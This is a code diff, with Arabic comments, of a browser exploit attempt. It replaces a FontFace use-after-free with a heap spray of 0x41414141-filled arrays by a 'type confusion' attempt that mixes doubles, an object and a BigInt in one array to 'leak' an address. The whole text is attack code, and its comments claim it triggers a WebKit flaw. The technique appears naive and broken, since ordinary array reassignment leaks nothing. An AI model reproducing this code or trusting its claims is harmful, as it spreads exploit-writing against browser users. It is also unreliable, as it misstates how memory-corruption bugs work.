@@ -1,46 +1,22 @@
-<!DOCTYPE html>
-<html>
-<body style="background:#000; color:#0f0; font-family:monospace; padding:20px;">
-    <div id="log">بدء الضغط على الذاكرة...</div>
-    <script>
-        function log(m) { document.getElementById('log').innerHTML += "<div>" + m + "</div>"; }
+try {
+    log("جاري إعداد فخ التداخل (Type Confusion)...");
 
-        // 1. إنشاء كائن فونت وحذفه فوراً
-        let A = new FontFace('x', 'local(Arial)', {});
-        document.fonts.add(A);
-        document.fonts.delete(A); // حذف الكائن فوراً لجعله مرشحاً للـ GC
-
-        // 2. إرهاق الذاكرة لإجبار المحرك على إعادة استخدام المكان المحرر
-        log("بدء الرش المكثف...");
-        let spray = [];
-        for(let i=0; i<5000; i++) {
-            spray.push(new Uint32Array(0x1000).fill(0x41414141));
-        }
-        
-        log("الرش اكتمل. جاري محاولة الوصول للذاكرة...");
-        
-        // 3. محاولة الوصول للكائن المحرر (بدون then)
-       try {
-    log("جاري محاولة القفز إلى العنوان (VTable Hijacking)...");
-
-    // نستخدم مصفوفة بها كائنات، ونحاول استبدال كائن منها بالكائن المسموم
-    let arr = [A]; 
+    // 1. إنشاء مصفوفة أرقام (Packed Double)
+    let arr = [1.1, 2.2, 3.3];
     
-    // محاولة إجبار المحرك على استخدام الخاصية كـ Pointer أثناء القراءة
-    let forceRead = arr[0].family; 
+    // 2. محاولة إجبار المحرك على جعلها مصفوفة كائنات (Array of Objects)
+    // هذا التلاعب هو الذي يسبب الثغرة في محركات WebKit
+    arr[0] = {a: 1}; 
     
-    // هذا السطر هو الذي سيسبب الانهيار إذا كان العنوان غير صالح
-    log("البيانات في العنوان هي: " + forceRead.toString(16));
+    // 3. محاولة "تسميم" المصفوفة بقيمة كبيرة جداً
+    arr[1] = 0x1234567890abcdefn; 
+
+    log("تم التسميم. جاري قراءة العنوان كـ Object...");
+    
+    // 4. هنا اللحظة الحاسمة: قراءة المصفوفة كأنها تحتوي كائنات
+    let leaked = arr[1]; 
+    log("البيانات المسترجعة من المصفوفة: " + leaked.toString(16));
 
 } catch(e) {
-    log("انهيار النظام: " + e.message);
+    log("خطأ في التداخل: " + e.message);
 }
-
-
-
-
-
-
-    </script>
-</body>
-</html>
